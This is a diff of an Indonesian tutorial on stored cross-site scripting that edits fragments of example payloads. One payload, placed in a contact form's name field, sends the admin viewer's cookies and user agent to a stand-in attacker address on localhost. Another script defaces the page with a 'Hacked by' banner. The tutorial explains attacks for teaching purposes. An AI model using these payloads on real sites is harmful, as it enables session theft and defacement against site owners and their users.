@@ -7,7 +7,7 @@ Mas John tidak melakukan sanitasi terhadap karaker special pada HTML seperti `<`
 Berikut ini adalah payload yang dikirimkan hacker pada inputan field Nama.
 
 ```
-<script>
+Pak Budi Baik<script>
 var getTheirIp = function(onDone) {
     var ajax = new XMLHttpRequest();
     ajax.addEventListener('load', function(e) {
@@ -36,7 +36,7 @@ getTheirIp( postToMe );
 </script>
 ```
 
-Fungsi dari payload diatas adalah mengirimkan data-data dari yang membuka pesan yang masuk di Contact Us dalam hal ini Mas John. Jadi ketika halaman Contact Us pada Admin area ditampilkan maka ia akan mengirimkan data ke alamat hacker yaitu `http://127.0.0.1:9091/collect/data/` informasi yang diambil adalah:
+Fungsi dari payload diatas adalah mengirimkan data-data dari yang membuka pesan yang masuk di Contact Us dalam hal ini Mas John. Jadi ketika halaman Contact Us pada Admin area ditampilkan maka ia akan mengirimkan data ke alamat hacker yaitu `http://127.0.0.1:9091/collect/?data` informasi yang diambil adalah:
 
 - User Agent
 - Cookie
@@ -54,6 +54,6 @@ Puisi kita adalah sebuab website kolaborasi tulisan antar seniman puisi. Penggun
 var body = '<div style="text-align:center;margin-top:100px;"><h2>Hacked by Mas Kher</h2><p>Special thanks to 4L4Y_N4ME.</p></div>';
 document.body.innerHTML = body;
 document.body.style.color = 'white';
-document.body.style.backgroundColor = '#333333';
+document.body.style.backgroundColor = '#111111';
 </script>
 ```
